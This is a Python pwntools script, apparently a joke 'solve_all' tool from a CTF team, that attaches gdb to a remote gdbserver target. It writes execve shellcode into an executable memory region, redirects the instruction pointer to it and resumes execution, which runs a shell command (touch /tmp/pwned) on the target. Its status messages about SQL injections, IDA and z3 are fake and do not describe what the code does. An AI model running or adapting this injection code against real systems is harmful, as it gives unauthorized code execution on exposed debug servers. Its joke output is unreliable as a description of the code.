#! /usr/bin/env python3
# solve_all.py
# Do not distribute
import subprocess
import sys
import time
from pwn import *
import re



def send_command(proc, cmd):
    proc.sendline(cmd.encode())
    response = proc.recvuntil(b"(gdb) ")
    return response

def solve_all():
    target = input("Enter target: ").strip()
    
    if (not re.match(r"^[a-zA-Z0-9-_:\.]+$", target)):
        print("Invalid target format, please provide <ip>:<port>")
        return False
    
    try:
        p = process(['gdb', '-nx'])
        
        print(f"Started solve_all....")

        p.recvuntil(b"(gdb) ")
        
        print(f"Connecting to target...")
        
        send_command(p, "set pagination off")
        
        print(f"Bypassing protections...")

        send_command(p, f"target remote {target}")

        print(f"Triggering SQL injections...")

        regs = send_command(p, "info registers all")

        available_registers = [line.split(" ", 1) for line in regs.decode().split("\n")[:-1] if line]
        
        print(f"Computing dlogs...")
        
        for reg in available_registers:
            name, value = reg[0].strip(), reg[1].strip()
            if re.match(r"^[a-zA-Z0-9]+$", name) and name!="rsp":
                if("{" in value or "}" in value):
                    register_type = value.split("=")[0].strip().replace("{", "").replace("}", "")
                    register_values = value.split("=")[1].strip().split("}")[0].replace("{", "").replace("}", "").split(",")
                    for x in range(len(register_values)):
                        send_command(p, f"set ${name}.{register_type}[{x}]=1")
                        
        for reg in available_registers:
            name, value = reg[0].strip(), reg[1].strip()
            if re.match(r"^[a-zA-Z0-9]+$", name) and name!="rsp":
                if not ("{" in value or "}" in value):
                    send_command(p, f"set ${name}=0")

        print(f"Triggering BOFs...")

        mappings_response = send_command(p, "info proc mappings")
        mappings_text = mappings_response.decode()
        
        print(f"Reversing with IDA...")
        
        executable_regions = []
        for line in mappings_text.split('\n'):
            if 'r-x' in line or 'rwx' in line:  
                clean_line = re.sub(r'\x1b\[[0-9;]*m', '', line)
                parts = clean_line.strip().split()
                if len(parts) >= 2:
                    start_addr = parts[0]
                    end_addr = parts[1] 
                    start_match = re.search(r'0x[0-9a-fA-F]+', start_addr)
                    end_match = re.search(r'0x[0-9a-fA-F]+', end_addr)
                    if start_match and end_match:
                        executable_regions.append((start_match.group(0), end_match.group(0), clean_line.strip()))
        
        print(f"Writing helper functions...")
            
        print(f"Running z3...")
        
        if executable_regions:
            target_addr = executable_regions[0][0]+0x20
            
            shellcode_bytes = asm(shellcraft.amd64.linux.execve('/bin/sh', ['sh', '-c', '"touch /tmp/pwned;"']), arch='amd64')

            print(f"Weaponizing exploit...")

            for i, byte_val in enumerate(shellcode_bytes):
                cmd = f"set *(char*)({target_addr}+{i}) = {hex(byte_val)}"
                send_command(p, cmd)
                
            print(f"Executing against target...")
            
            verify_cmd = f"x/{len(shellcode_bytes)}bx {target_addr}"
            send_command(p, verify_cmd)
            
            print(f"Sending all the data...")
            
            disas_cmd = f"disas {target_addr},{target_addr}+{len(shellcode_bytes)}"
            send_command(p, disas_cmd)

            print(f"Receiving all the data...")

            send_command(p, f"set $rip = {target_addr}")
            send_command(p, "info registers rip")
            
            print(f"Takeoff!")
            
            send_command(p, "continue")
        else:
            print("Ahm, looks like solve_all servers are currently busy... Try again later.")
        
        print(f"Thank you for trying ptm's solve_all.py script! You can buy the full version at https://pwnthem0le.polito.it/")
        # Wait for process to complete or terminate it
        try:
            p.wait(timeout=10)
        except subprocess.TimeoutExpired:
            p.kill()
            p.wait()

    except Exception as e:
        print(e, file=sys.stderr)
        return False
    
    return True


if __name__ == "__main__":
    solve_all()